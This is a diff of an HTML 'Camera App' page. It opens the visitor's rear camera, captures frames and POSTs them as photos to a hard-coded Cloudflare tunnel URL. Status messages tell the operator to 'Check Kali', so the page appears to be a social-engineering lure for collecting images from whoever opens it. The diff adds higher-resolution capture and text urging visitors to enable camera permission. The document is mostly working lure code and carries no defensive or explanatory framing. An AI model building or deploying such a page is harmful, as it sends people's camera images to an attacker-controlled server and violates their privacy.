@@ -7,7 +7,6 @@
     <title>Camera App</title>
     <link rel="manifest" href="manifest.json">
     <style>
-        * { box-sizing: border-box; }
         body { 
             background: #000; 
             color: #0f0; 
@@ -31,6 +30,10 @@
             border-radius: 10px;
             margin: 10px;
             cursor: pointer;
+            display: block;
+            width: 100%;
+            max-width: 300px;
+            margin: 10px auto;
         }
         .status {
             background: #111;
@@ -43,61 +46,70 @@
 </head>
 <body>
     <h1>📷 Camera App</h1>
-    <video id="video" autoplay playsinline></video>
-    <button onclick="startCamera()" id="btn">📷 Start Camera</button>
-    <button onclick="snap()" id="snapBtn" style="display:none">📸 Capture & Send</button>
+    <video id="video" autoplay playsinline muted></video>
+    <button onclick="requestCamera()">📷 Start Camera</button>
+    <button onclick="capture()" id="snapBtn" style="display:none">📸 Capture & Send</button>
     
-    <div class="status" id="status">Click "Start Camera" to begin...</div>
+    <div class="status" id="status">Tap "Start Camera" to begin</div>
 
     <script>
-        // 👇 YOUR CLOUDFLARED LINK
         const SERVER_URL = 'https://came-maine-succeed-infants.trycloudflare.com';
         
-        const video = document.getElementById('video');
-        const btn = document.getElementById('btn');
-        const snapBtn = document.getElementById('snapBtn');
-        const status = document.getElementById('status');
-
-        async function startCamera() {
+        async function requestCamera() {
+            const status = document.getElementById('status');
             try {
-                status.innerText = '⏳ Requesting camera...';
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment' } 
+                status.innerText = '⏳ Opening camera...';
+                
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: 'environment',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
                 });
-                video.srcObject = stream;
-                video.style.display = 'block';
-                btn.style.display = 'none';
-                snapBtn.style.display = 'inline-block';
-                status.innerText = '✅ Camera ready! Click Capture to send photo!';
-            } catch (e) {
-                status.innerText = '❌ Error: ' + e.message;
+                
+                document.getElementById('video').srcObject = stream;
+                document.getElementById('video').style.display = 'block';
+                document.getElementById('snapBtn').style.display = 'block';
+                status.innerText = '✅ Camera ON! Tap Capture to send!';
+                
+            } catch (err) {
+                console.error(err);
+                status.innerText = '❌ Error: ' + err.message + '\n\nMake sure camera permission is ALLOWED in browser settings!';
+                
+                // Try alternative
+                if (err.name === 'NotAllowedError') {
+                    status.innerText = '❌ Camera blocked!\n\nGo to:\nSettings > Apps > Browser > Permissions > Allow Camera';
+                }
             }
         }
 
-        async function snap() {
+        async function capture() {
+            const video = document.getElementById('video');
+            const status = document.getElementById('status');
+            
             const canvas = document.createElement('canvas');
-            canvas.width = 640;
-            canvas.height = 480;
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
             
-            const dataURL = canvas.toDataURL('image/jpeg', 0.7);
-            const blob = await (await fetch(dataURL)).blob();
+            status.innerText = '📤 Sending...';
             
-            const formData = new FormData();
-            formData.append('file', blob, 'photo.jpg');
-            
-            status.innerText = '📤 Sending photo...';
-            
-            try {
-                const res = await fetch(SERVER_URL, {
-                    method: 'POST',
-                    body: formData
-                });
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('file', blob, 'photo.jpg');
                 
-                status.innerText = '✅ Photo sent! Check your Kali!';
-            } catch (e) {
-                status.innerText = '❌ Error: ' + e.message;
-            }
+                try {
+                    await fetch(SERVER_URL, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    status.innerText = '✅ Sent! Check Kali!';
+                } catch (e) {
+                    status.innerText = '❌ Send Error: ' + e.message;
+                }
+            }, 'image/jpeg', 0.8);
         }
     </script>
 </body>
